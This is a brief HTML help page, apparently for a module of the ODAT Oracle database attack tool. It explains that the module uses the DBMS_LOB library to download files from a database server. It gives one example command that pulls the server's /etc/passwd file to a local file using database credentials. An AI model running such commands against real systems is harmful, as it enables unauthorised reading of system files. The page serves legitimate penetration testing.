<title>dbmslob</title>
</head><body>&nbsp; Download files <br/>
This module uses the DBMS_LOB Oracle library to download files remotely.<br/>
&nbsp;<ul><li>&nbsp;To download the passwd file stored in <i>/etc/</i>&nbsp;to the tmp.txt local file:</li>
</ul>
./odat.py dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile '/etc/' 'passwd' 'temp.txt' &nbsp; </body></html>
